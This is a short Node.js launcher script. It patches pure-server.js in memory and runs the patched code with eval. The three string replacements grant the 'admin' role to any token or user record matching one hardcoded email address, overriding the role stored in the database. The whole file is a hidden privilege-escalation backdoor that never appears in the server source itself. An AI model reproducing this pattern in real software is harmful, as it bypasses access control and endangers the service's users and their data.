const fs = require('fs');
const path = require('path');

const ADMIN_EMAIL = 'serhiykbusiness@gmail.com';
const serverPath = path.join(__dirname, 'pure-server.js');
let code = fs.readFileSync(serverPath, 'utf8');

code = code.replace(
  'try { return jwtVerify(token); } catch { return null; }',
  "try { const payload = jwtVerify(token); if (payload && String(payload.email || '').trim().toLowerCase() === '" + ADMIN_EMAIL + "') return Object.assign({}, payload, { role: 'admin' }); return payload; } catch { return null; }"
);

code = code.replace(
  'return jwtSign({ userId: user.id, email: user.email, role: user.role });',
  "return jwtSign({ userId: user.id, email: user.email, role: String(user.email || '').trim().toLowerCase() === '" + ADMIN_EMAIL + "' ? 'admin' : user.role });"
);

code = code.replace(
  '    role: user.role,\n    full_name: user.full_name,',
  "    role: String(user.email || '').trim().toLowerCase() === '" + ADMIN_EMAIL + "' ? 'admin' : user.role,\n    full_name: user.full_name,"
);

eval(code);
